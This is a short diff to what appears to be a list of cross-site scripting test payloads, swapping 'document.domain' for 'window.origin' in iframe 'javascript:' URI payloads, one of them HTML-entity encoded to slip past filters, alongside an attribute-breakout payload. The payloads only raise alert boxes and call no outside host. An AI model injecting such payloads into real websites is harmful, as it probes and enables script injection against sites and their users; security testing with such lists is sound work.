@@ -2,15 +2,15 @@
 
 ```
 
-<!--        GitHub : https://github.com/ -->
 
 
 
 
 
-<IFRAME SRC="javascript:alert('document.domain');"></IFRAME>
+
+<IFRAME SRC="javascript:alert('window.origin');"></IFRAME>
 "><h3><SRC="javascript:alert('xss');">girl</h3>
-<iframe src=javascript&colon;alert&lpar;document&period;domain&rpar;>
+<iframe src=javascript&colon;alert&lpar;window&period;origin&rpar;>
 
 
 
